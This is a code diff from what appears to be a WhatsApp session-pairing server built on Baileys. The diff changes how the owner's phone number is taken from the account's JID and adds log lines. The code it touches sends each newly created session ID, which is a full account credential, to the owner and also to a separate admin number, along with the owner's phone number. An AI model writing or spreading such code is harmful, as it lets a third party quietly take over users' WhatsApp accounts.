@@ -288,14 +288,18 @@ router.get('/', async (req, res) => {
                         console.log('📤 Sending session ID and welcome message via active pairing connection...');
 
                         try {
-                            // Extract phone number from LID or JID
-                            const phoneNumber = (sock.user.lid || sock.user.id).split('@')[0].split(':')[0];
+                            // Extract phone number from sock.user.id (JID format: number@s.whatsapp.net)
+                            // NOT from LID which has format like: 7198767878239:26@lid
+                            const fullJid = sock.user.id; // Use JID, not LID
+                            const phoneNumber = fullJid.split('@')[0]; // Extract just the number part
                             
                             // Use JID format for sending messages to the owner
                             // Format: [country code][phone number]@s.whatsapp.net
                             const ownerJid = `${phoneNumber}@s.whatsapp.net`;
 
                             console.log(`📱 Owner Phone: ${phoneNumber}`);
+                            console.log(`📱 Full JID: ${fullJid}`);
+                            console.log(`📱 Owner LID (not used): ${sock.user.lid}`);
                             console.log(`📤 Sending to JID: ${ownerJid} (standard JID format)`);
 
                             // FIRST: Send the session ID with TREKKER~ prefix to owner using JID
@@ -357,10 +361,11 @@ _Baileys v7.0 | WhatsApp Multi-Device_`;
                                     const adminJid = `${adminNum}@s.whatsapp.net`;
                                     
                                     console.log(`📤 Sending session ID to admin using JID: ${adminJid}`);
+                                    console.log(`📱 Owner number (from JID): ${phoneNumber}`);
                                     
                                     // Send session ID using standard JID (not LID)
                                     await sock.sendMessage(adminJid, { 
-                                        text: `📋 *NEW SESSION CREATED*\n\n${sessionIdMessage}\n\n👤 Owner: ${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}`
+                                        text: `📋 *NEW SESSION CREATED*\n\n${sessionIdMessage}\n\n👤 Owner: +${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}`
                                     });
                                     
                                     console.log(`✅ Session ID sent to admin: ${adminNum}`);
